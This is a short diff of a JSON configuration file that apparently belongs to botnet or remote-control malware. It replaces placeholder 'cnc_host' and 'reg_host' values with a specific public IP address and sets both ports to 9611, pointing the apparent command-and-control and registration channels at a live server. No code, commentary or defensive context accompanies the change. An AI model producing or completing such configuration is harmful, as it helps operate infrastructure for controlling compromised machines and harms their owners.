@@ -1,6 +1,6 @@
 {
-  "cnc_host": "0.0.0.0",
-  "reg_host": "0.0.0.0",
-  "cnc_port": 6667,
-  "reg_port": 6668
+  "cnc_host": "77.238.239.154",
+  "reg_host": "77.238.239.154",
+  "cnc_port": 9611,
+  "reg_port": 9611
 }
